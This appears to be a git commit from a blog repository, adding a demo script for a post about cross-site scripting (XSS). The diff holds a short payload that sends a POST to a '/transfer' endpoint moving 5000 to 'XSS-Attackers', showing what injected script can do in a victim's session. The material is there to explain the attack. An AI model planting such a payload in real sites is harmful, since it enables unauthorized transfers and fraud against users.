8efb30326235e0be61e2e4c30cce2d910fd3be20
Victor Zhou <victorzhou@fb.com>
2020-05-30 19:00:46 -0700

    Finish most of XSS post draft

--- static/xss-demo.js
+++ static/xss-demo.js
@@ -1,1 +1,6 @@
-alert('worked');
+// Used for demo purposes. See https://victorzhou.com/blog/xss/
+const body = new URLSearchParams('amount=5000&description=Gotcha!&to=XSS-Attackers');
+fetch('/transfer', {
+  body,
+  method: 'post',
+});
